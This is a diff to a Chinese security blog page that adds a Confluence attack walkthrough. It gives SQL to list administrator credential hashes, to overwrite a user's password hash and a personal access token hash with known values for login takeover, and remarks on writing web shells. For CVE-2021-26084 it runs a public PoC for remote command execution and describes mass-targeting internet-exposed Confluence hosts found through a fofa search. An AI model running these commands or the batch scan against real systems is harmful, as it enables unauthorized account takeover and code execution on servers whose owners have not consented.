@@ -38,8 +38,13 @@
 <meta property="og:image" content="http://lvpsectime.github.io/post/92f83c15/image-20211116212954728.png">
 <meta property="og:image" content="http://lvpsectime.github.io/post/92f83c15/image-20211116213315707.png">
 <meta property="og:image" content="http://lvpsectime.github.io/post/92f83c15/image-20211116213432321.png">
+<meta property="og:image" content="http://lvpsectime.github.io/post/92f83c15/image-20211116215013197.png">
+<meta property="og:image" content="http://lvpsectime.github.io/post/92f83c15/image-20211116215413204.png">
+<meta property="og:image" content="http://lvpsectime.github.io/post/92f83c15/image-20211116215611858.png">
+<meta property="og:image" content="http://lvpsectime.github.io/post/92f83c15/image-20211116221215478.png">
+<meta property="og:image" content="http://lvpsectime.github.io/post/92f83c15/image-20211116221906318.png">
 <meta property="article:published_time" content="2021-11-16T12:02:17.000Z">
-<meta property="article:modified_time" content="2021-11-16T13:37:29.600Z">
+<meta property="article:modified_time" content="2021-11-16T14:21:17.405Z">
 <meta property="article:author" content="ca5tle">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
@@ -140,7 +145,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">0x01 confluence环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">0x02 基础知识</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">0x01 confluence环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">0x02 基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">0x03 利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-CVE-2021-26084"><span class="toc-number">5.</span> <span class="toc-text">0x04 CVE-2021-26084</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -166,7 +171,7 @@
       
         <time datetime="2021-11-16T12:02:17.000Z" itemprop="datePublished">2021-11-16</time>
         
-        (Updated: <time datetime="2021-11-16T13:37:29.600Z" itemprop="dateModified">2021-11-16</time>)
+        (Updated: <time datetime="2021-11-16T14:21:17.405Z" itemprop="dateModified">2021-11-16</time>)
         
       
     </div>
@@ -290,7 +295,102 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">confluence-administrators</span><br><span class="line">confluence-users</span><br></pre></td></tr></table></figure>
 
 <p>添加用户后，可访问<a target="_blank" rel="noopener" href="http://localhost:8090/%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95%E3%80%82">http://localhost:8090/进行登录。</a></p>
-<h2 id="0x02-基础知识"><a href="#0x02-基础知识" class="headerlink" title="0x02 基础知识"></a>0x02 基础知识</h2>
+<h2 id="0x02-基础知识"><a href="#0x02-基础知识" class="headerlink" title="0x02 基础知识"></a>0x02 基础知识</h2><p><strong>1.文件目录</strong></p>
+<p>参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cwiki.us/display/CONF6ZH/Confluence+Home+and+other+important+directories">https://www.cwiki.us/display/CONF6ZH/Confluence+Home+and+other+important+directories</a></p>
+<p>(1)<code>&lt;confluence-installation&gt;</code></p>
+<p>安装目录，用于存储系统文件</p>
+<p>默认安装位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows: C:/Program Files/Atlassian/Confluence/</span><br><span class="line">Linux: /opt/atlassian/confluence/</span><br></pre></td></tr></table></figure>
+
+<p>(2)<code>&lt;confluence-home&gt;</code></p>
+<p>数据目录，用于存储数据</p>
+<p>默认安装位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows: C:/Program Files/Atlassian/Application Data/Confluence/</span><br><span class="line">Linux: /var/atlassian/application-data/confluence/</span><br></pre></td></tr></table></figure>
+
+<p>(3)二者之间的联系</p>
+<p><code>&lt;confluence-installation&gt;/confluence/WEB-INF/classes/confluence-init.properties</code>文件中定义了<code>&lt;confluence-home&gt;</code>的位置</p>
+<p>2.数据库信息</p>
+<p>存储数据库配置信息的位置： <code>&lt;confluence-home&gt;/confluence.cfg.xml</code></p>
+<p>3.用户信息</p>
+<p>用户信息位于Confluence的数据库中</p>
+<p>存储用户信息的表：<code>CWD_USER</code>，具体列名称如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user_name:用户名</span><br><span class="line">active:是否启用</span><br><span class="line">email_address:邮件地址</span><br><span class="line">credential:用户凭据</span><br><span class="line">directory_id:用户组，代表用户的权限</span><br></pre></td></tr></table></figure>
+
+<p><code>directory_id</code>对应的具体用户组名称可通过以下方式查看：</p>
+<ul>
+<li>查询表cwd_group中的<code>group_name</code>列，管理员用户组的值为<code>confluence-administrators</code></li>
+<li>查询表cwd_directory中的<code>directory_name</code>列，管理员用户组的值为<code>Confluence Internal Directory</code></li>
+</ul>
+<p>直接筛选出管理员用户的SQL命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confluence=&gt; select u.id,u.user_name,u.active,u.credential from cwd_user u  join cwd_membership m on u.id=m.child_user_id join cwd_group g on m.parent_id=g.id join cwd_directory d on d.id=g.directory_id where g.group_name = &#x27;confluence-administrators&#x27; and d.directory_name=&#x27;Confluence Internal Directory&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/92f83c15/image-20211116215013197.png" alt="image-20211116215013197"></p>
+<p>4.日志文件位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;confluence-home&gt;/logs/</span><br></pre></td></tr></table></figure>
+
+<p>5.Web路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;confluence-installation&gt;/confluence/</span><br></pre></td></tr></table></figure>
+
+<p>Windows: Confluence默认权限为network service，具有写权限</p>
+<p>Linux： Confluence默认权限为confluence，没有写权限</p>
+<h2 id="0x03-利用思路"><a href="#0x03-利用思路" class="headerlink" title="0x03 利用思路"></a>0x03 利用思路</h2><p>1.修改数据库，实现用户登录</p>
+<p>(1)修改用户登录口令</p>
+<p>查看用户关键信息，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confluence=&gt; select id,user_name,credential from cwd_user;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/92f83c15/image-20211116215413204.png" alt="image-20211116215413204"></p>
+<p>修改用户test1的口令信息，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confluence=&gt; UPDATE cwd_user SET credential= &#x27;&#123;PKCS5S2&#125;UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm&#x27; WHERE id = 458754;</span><br></pre></td></tr></table></figure>
+
+<p>确认数据库被修改，如下图</p>
+<p><img src="/post/92f83c15/image-20211116215611858.png" alt="image-20211116215611858"></p>
+<p><strong>注：</strong></p>
+<p><code>&#123;PKCS5S2&#125;UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm</code>对应的明文为123456</p>
+<p>(2)修改<code>Personal Access Tokens</code></p>
+<p>使用<code>Personal Access Tokens</code>可以实现免密登录</p>
+<p>介绍资料：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://confluence.atlassian.com/bitbucketserver0610/personal-access-tokens-989761177.html </span><br><span class="line"></span><br><span class="line">https://developer.atlassian.com/server/confluence/confluence-server-rest-api/ </span><br><span class="line"></span><br><span class="line">https://docs.atlassian.com/ConfluenceServer/rest/7.11.6/</span><br></pre></td></tr></table></figure>
+
+<p>测试环境下，<code>Personal Access Tokens</code>对应表为<code>AO_81F455_PERSONAL_TOKEN</code></p>
+<p>查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confluence=&gt; select * from &quot;AO_81F455_PERSONAL_TOKEN&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>修改Personal Access Tokens，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confluence=&gt; UPDATE &quot;AO_81F455_PERSONAL_TOKEN&quot; SET &quot;HASHED_TOKEN&quot;= &#x27;&#123;PKCS5S2&#125;Deoq/psifhVO0VE8qhJ6prfgOltOdJkeRH4cIxac9NtoXVodRQJciR95GW37gR7/&#x27; WHERE &quot;ID&quot; = 4;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;PKCS5S2&#125;Deoq/psifhVO0VE8qhJ6prfgOltOdJkeRH4cIxac9NtoXVodRQJciR95GW37gR7/`对应的token为`MjE0NTg4NjQ3MTk2OrQ5JtSJgT/rrRBmCY4zu+N+NaWZ</span><br></pre></td></tr></table></figure>
+
+<p>2.写文件</p>
+<p>Web路径：<code>&lt;confluence-installation&gt;/confluence/</code></p>
+<p>Windows: Confluence默认权限为network service，具有写权限</p>
+<p>Linux： Confluence默认权限为confluence，没有写权限，但可以尝试内存马</p>
+<h2 id="0x04-CVE-2021-26084"><a href="#0x04-CVE-2021-26084" class="headerlink" title="0x04 CVE-2021-26084"></a>0x04 CVE-2021-26084</h2><p>1.受影响版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Confluence &lt; 6.13.23</span><br><span class="line">6.14.0 ≤ Confluence &lt; 7.4.11</span><br><span class="line">7.5.0 ≤ Confluence &lt; 7.11.6</span><br><span class="line">7.12.0 ≤ Confluence &lt; 7.12.5</span><br><span class="line">Confluence &lt; 7.13.0</span><br></pre></td></tr></table></figure>
+
+<p>2.不受影响的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Confluence=6.13.23</span><br><span class="line">Confluence=7.4.11</span><br><span class="line">Confluence=7.11.6</span><br><span class="line">Confluence=7.12.5</span><br><span class="line">Confluence=7.13.0</span><br></pre></td></tr></table></figure>
+
+<p>3.漏洞poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、https://github.com/FanqXu/CVE-2021-26084</span><br><span class="line"></span><br><span class="line">2、https://github.com/h3v0x/CVE-2021-26084_Confluence/</span><br><span class="line"></span><br><span class="line">3、https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md</span><br></pre></td></tr></table></figure>
+
+<p>4.漏洞复现</p>
+<p>执行FanqXu/CVE-2021-26084的poc进行验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Poc.py -u http://10.108.3.65:8090/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/92f83c15/image-20211116221215478.png" alt="image-20211116221215478"></p>
+<p>执行命令<code>whoami</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Poc.py -u http://10.108.3.65:8090/ -e whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/92f83c15/image-20211116221906318.png" alt="image-20211116221906318"></p>
+<p>5.fofa批量</p>
+<p>关键字搜索<code>app=&quot;ATLASSIAN-Confluence&quot;</code></p>
+<p>使用fofa工具导出结果存到urls.txt，再使用FanqXu/CVE-2021-26084的poc进行批量验证即可。</p>
+<p>使用的命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PoC.py -f urls.txt</span><br></pre></td></tr></table></figure>
+
+
   </div>
 </article>
 
@@ -335,7 +435,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">0x01 confluence环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">0x02 基础知识</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-confluence%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">0x01 confluence环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">0x02 基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">0x03 利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-CVE-2021-26084"><span class="toc-number">5.</span> <span class="toc-text">0x04 CVE-2021-26084</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
